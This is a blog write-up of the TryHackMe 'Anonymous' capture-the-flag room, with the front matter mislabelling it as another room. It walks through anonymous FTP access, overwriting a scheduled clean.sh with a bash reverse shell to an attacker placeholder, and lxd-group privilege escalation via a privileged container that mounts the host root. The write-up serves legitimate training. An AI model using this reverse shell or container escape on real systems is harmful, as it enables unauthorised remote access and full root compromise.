---
layout: post
title: Anonymous
date:   2025-10-05 11:05
description: TryHackMe chocolate factory CTF Write-Up
tags: tryhackme lxd 
comments: false
---
-TRYHACKME CTF WRITEUP-
<br>
<br>
![img]({{ '/assets/images/anon/anon.png' | relative_url }}){: .center-image }
[Link To CTF](https://tryhackme.com/room/anonymous)
<br>
<br>
<br>
## Let's start with an nmap scan to enumerate the ports 
{% highlight html %}
$ nmap -sCV <target_IP>
{% endhighlight html %}
## Running this gives us the answers to the first 3 questions:
![img]({{ '/assets/images/anon/1-anon.png' | relative_url }}){: .center-image }
<br>

{% highlight bash %}
"How many ports are open?
What service is running on port 21?
What service is running on ports 139 and 445? 21?"
{% endhighlight bash %}
<br>
<br>

## Lets start smbmap to enumerate the open shares
{% highlight bash %}
$ smbmap -H <target_IP>
{% endhighlight bash %}
![img]({{ '/assets/images/anon/2-anon.png' | relative_url }}){: .center-image }
## Running this we can see the answer to question 4:
{% highlight bash %}
"There's a share on the user's computer.  What's it called?"
{% endhighlight bash %}
<br>
<br>

## Now that thats out of the way lets get that User and Root Flag ...
<br>
<br>

## I admittedly originally thought this was a steganography challenge
## I spent awhile looking for hidden data in the dog pictures
## And while they are adorable, there was nothing more to be found there
<br>
<br>

## Moving to the ftp server,
## We can see that we are allowed to login as anonymous
{% highlight bash %}
$ ftp anonymous@<target_IP>
{% endhighlight bash %}
## We can see a directory named scripts...interesting
![img]({{ '/assets/images/anon/3-anon.png' | relative_url }}){: .center-image }
<br>

## Lets download the files inside to our local machine
{% highlight bash %}
ftp> prompt 
ftp> mget clean.sh removed_files.log to_do.txt
{% endhighlight bash %}
<br>

## Lets inspect 'clean.sh'
## Looking at this shows us not only a bash script, but a scheduled task
![img]({{ '/assets/images/anon/4-anon.png' | relative_url }}){: .center-image }
<br>

## Let's modify this and re-upload it to the target machine 
{% highlight bash %}
$ nano clean.sh
{% endhighlight bash %}
## We will use the basic bash script from: 
## [pentest monkey reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
<br>

## On our machine, 
## Lets replace the contents of clean.sh with the following:
{% highlight bash %}
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'
{% endhighlight bash %}
![img]({{ '/assets/images/anon/5-anon.png' | relative_url }}){: .center-image }
<br>

## Now lets start up our netcat listener 
{% highlight bash %}
$ nc -lvnp <port>
{% endhighlight bash %}
<br>

## Now lets go back to the FTP server and upload the new file, replacing the old script
{% highlight bash %}
ftp> put clean.sh
{% endhighlight bash %}
![img]({{ '/assets/images/anon/6-anon.png' | relative_url }}){: .center-image }
<br>

## Within a few moments we get a connection back to our listener
![img]({{ '/assets/images/anon/7-anon.png' | relative_url }}){: .center-image }
<br>

## We can immediately see the user flag:
![img]({{ '/assets/images/anon/8-anon.png' | relative_url }}){: .center-image }
## We now have access to the target machine and have captured the user flag
<br>

## Let's now escalate privilege and get the root flag!
<br>
<br>
<br>

# Priv Esc
<br>
<br>

## We cannot run sudo -l...
## But running the "id", We can see this user has access to the lxd group
![img]({{ '/assets/images/anon/9-anon.png' | relative_url }}){: .center-image }
<br>

{% highlight bash %}
Google search shows:
"This is a well-documented and easy-to-perform attack if an attacker's user account has been added to the lxd group. LXD's daemon runs as root, and any user with write access to its UNIX socket can execute privileged actions." " The core issue is that the lxd daemon runs with root privileges and will perform privileged actions for members of the lxd group, essentially making anyone in that group a root-equivalent user"
{% endhighlight bash %}
## Exploit DB shows us how this can be exploited:
## [Exploit-db/exploits/46978](https://www.exploit-db.com/exploits/46978)
<br>

## First download lxd apline builder on our machine:
{% highlight bash %}
$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
{% endhighlight bash %}
<br>

## Then build the file:
{% highlight bash %}
$ sudo bash build-alpine
{% endhighlight bash %}
<br>

## Check for the .tar.gz file:
![img]({{ '/assets/images/anon/10-anon.png' | relative_url }}){: .center-image }
<br>

## Create a web server to transfer the file to the victim machine 
{% highlight bash %}
$ sudo python3 -m http.server 8080
{% endhighlight bash %}
<br>

## Then on the victim machine, download the .tar.gz file
{% highlight bash %}
$ wget 10.*.*.*:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
{% endhighlight bash %}
<br>

## Then started building the image file in the victim’s machine:
('anon' and 'my image' can be replaced with whatever)
{% highlight bash %}
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list
lxd init  (set a name and then use the default options)
lxc init myimage anon -c security.privileged=true
lxc config device add anon mydevice disk source=/ path=/mnt/root recursive=true
lxc start anon
{% endhighlight bash %}
<br>

![img]({{ '/assets/images/anon/11-anon.png' | relative_url }}){: .center-image }
![img]({{ '/assets/images/anon/12-anon.png' | relative_url }}){: .center-image }
![img]({{ '/assets/images/anon/13-anon.png' | relative_url }}){: .center-image }
<br>

## We can now run 'lxc exec anon /bin/sh' to get root:
{% highlight bash %}
$ lxc exec anon /bin/sh
{% endhighlight bash %}
![img]({{ '/assets/images/anon/14-anon.png' | relative_url }}){: .center-image }
<br>

## We then get the flag on the /mnt directory where we had mounted our root folder with the earlier command
{% highlight bash %}
cd /mnt/root
cat root.txt
{% endhighlight bash %}
![img]({{ '/assets/images/anon/15-anon.png' | relative_url }}){: .center-image }
<br>
<br>

## WE HAVE NOW PWND THE MACHINE AND ESCALATED PRIVILEGES TO CAPTURE THE ROOT FLAG
